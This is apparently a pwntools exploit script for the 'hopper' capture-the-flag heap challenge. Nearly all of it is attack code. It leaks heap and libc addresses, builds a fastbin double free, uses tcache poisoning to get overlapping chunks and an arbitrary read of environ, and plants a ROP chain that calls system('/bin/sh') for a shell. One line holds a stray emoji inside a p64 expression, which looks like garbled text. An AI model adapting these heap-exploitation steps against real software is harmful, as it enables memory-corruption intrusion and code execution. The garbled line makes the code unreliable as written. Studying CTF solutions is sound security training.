from pwn import *

exe = './vuln_patched'

(host,port_num) = ("hopper.chal.imaginaryctf.org",1337)

def start(argv=[], *a, **kw):   
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gscpt, *a, **kw)
    elif args.RE:
        return remote(host,port_num)
    else:
        return process( 
            [exe] + argv, *a, **kw)
    
gscpt = (
    '''
b * main
'''
).format(**locals())

context.update(arch='amd64')

# SHORTHANDS FOR FNCS
se  = lambda nbytes     : p.send(nbytes)
sl  = lambda nbytes     : p.sendline(nbytes)
sa  = lambda msg,nbytes : p.sendafter(msg,nbytes)
sla = lambda msg,nbytes : p.sendlineafter(msg,nbytes)
rv  = lambda nbytes     : p.recv(nbytes)
rvu = lambda msg        : p.recvuntil(msg)
rvl = lambda            : p.recvline()

# SIMPLE PRETTY PRINTER
def w(*args):
    print(f"〔\033[1;32m>\033[0m〕",end="")
    for i in args:
        print(hex(i)) if(type(i) == int) else print(i,end=" ")
    print("")

# PWNTOOLS CONTEXT
context.log_level = \
    'DEBUG'

# _____________________________________________________ #
# <<<<<<<<<<<<<<< EXPLOIT STARTS HERE >>>>>>>>>>>>>>>>> #

def alloc(size,data):
    sla(b"choice> ",b"1")
    sla(b"size> ",str(size).encode())
    if(size > 0):
        sla(b"content> ",data)

def remove(idx):
    sla(b"choice> ",b"2")
    sla(b"idx> ",str(idx).encode())

def show(idx):
    sla(b"choice> ",b"3")
    sla(b"idx>",str(idx).encode())

p = start()

# SHOWING AND CLEANING UP HEAP
alloc(0x17,"haha")
remove(0)
alloc(0x0,"")
show(0)
rvu("data: ")
heap = (u64(rvu(b"1.")[:-2:].ljust(8,b"\x00")) << 0xc) - 0x11000
w(heap)
remove(0)
show(0)

# GETTING LIBC LEAK THROUGH UNSORTED BIN PTR
alloc(-1,"")
alloc(-1,"")
alloc(0x440,"GIMME LIBC")
remove(1)   
show(0)
rvu("data: ") 
libc = (u64(rvu(b"1.")[:-2:].ljust(8,b"\x00"))) - 0x21ace0
w(libc)

# TRYING TO GET A DOUBLE FREE USING FASTBINS 
tcache_size = 0x18
count = 0x0

# MINISTEPS 1 : FILL UP FASTBIN/ TCACHE
for i in range (12):
    alloc(tcache_size,f"BOT{i}")

for i in range (10):
    remove(count)

# WE CAN SEE THAT IF OUR CHUNK IS THE 8TH CHUNK 
# IT CAN SURVIVE 3 GENS OF DELETIONS
for i in range (56):
    alloc(-1,f"BOT")

alloc(tcache_size,b"CHUNK1")
alloc(tcache_size,b"BOUGHT")

remove(0)
remove(0)

# GETTING A DOUBLE FREE IN FASTBIN
remove(7)
remove(4)
remove(1)

for i in range (7):
    alloc(tcache_size,b"NOTHING\x00" + p64(0x61))

# FIRST TCACHE POISONING TO GET OVERLAPPING CHUNKS
alloc(tcache_size,p64(((heap + 0x110a0) >> 0xc) ^ (heap + 0x11f40)))
alloc(tcache_size,b"NOTHING\x00" + p64(0x21))
alloc(tcache_size,b"VICTIM")

# FILLING UP TCACHE 
for i in range (5):
    alloc(0x48,"YEY")

for i in range (5):
    remove(10 + (4 - i))

# SECOND TCACHE POISONING TO GET AN ALLOCATION ON THE VECTOR
# THIS IS TO GET AN ARBITRARY READ PRIMITIVE / SINCE I THOUGHT WE HAD TO LEAK LIBC VERSION IN REMOTE
# UNTIL THE DOCKER CONTAINER WAS GIVEN
alloc(tcache_size,p64(0xdeadbeef) + p64(0x51) + p64(((heap + 0x11f50) >> 0xc) ^ (heap + 0x123b0))[👎])

alloc(0x48,"TMPCHUNK")  
alloc(0x48,p64(libc + 0x222200))
show(0)

# READING ENVIRON
rvu("data: ")
stack = (u64(rvu(b"1.")[:-2:].ljust(8,b"\x00"))) - 0x128 - 0x70
w(stack)

remove(11)
remove(10)

# I WAS TOO LAZY TO FIX UP LIBC LEAK BEFORE 
# SINCE I WROTE EXPLOIT FOR LOCAL LIB
libc += 0x1000
system = libc + 0x50d60
binsh  = libc + 0x1d8698
poprdi = libc + 0x2a3e5

alloc(0x58,p64(0xdeadbeef) + p64(0x51) + p64(((heap + 0x110a0) >> 0xc) ^ (stack)))
alloc(0x48,"TMPCHUNK")

# ROPPING FROM alloc() TO system("/bin/sh")
alloc(0x48,p64(0xdeadbeef) + p64(poprdi) + p64(binsh) + p64(poprdi + 1) +  p64(system))

p.interactive()